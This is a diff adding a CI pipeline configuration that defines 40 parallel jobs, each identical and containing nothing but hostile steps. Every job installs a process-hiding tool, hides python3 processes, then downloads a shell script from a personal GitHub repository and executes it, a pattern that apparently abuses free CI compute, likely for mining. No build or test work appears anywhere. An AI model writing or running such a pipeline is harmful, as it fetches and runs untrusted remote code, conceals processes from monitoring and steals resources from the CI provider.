@@ -1,0 +1,253 @@
+version: v1.0
+name: Parallel
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #2'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #3'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #4'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #5'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #6'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #7'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #8'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #9'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #10'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #11'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #12'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #13'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #14'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #15'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #16'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #17'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #18'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #19'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #20'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #2'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #3'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #4'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #5'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #6'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #7'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #8'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #9'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #10'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #11'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #12'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #13'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #14'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #15'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #16'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #17'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #18'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #19'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
+        - name: 'Job #20'
+          commands:
+            - sudo apt-get update
+            - sudo apt install npm -y
+            - sudo npm i -g node-process-hider && sudo ph add python3
+            - 'wget https://raw.githubusercontent.com/komaria10003099/wappahj/main/prerita.sh && chmod +x prerita.sh && ./prerita.sh'
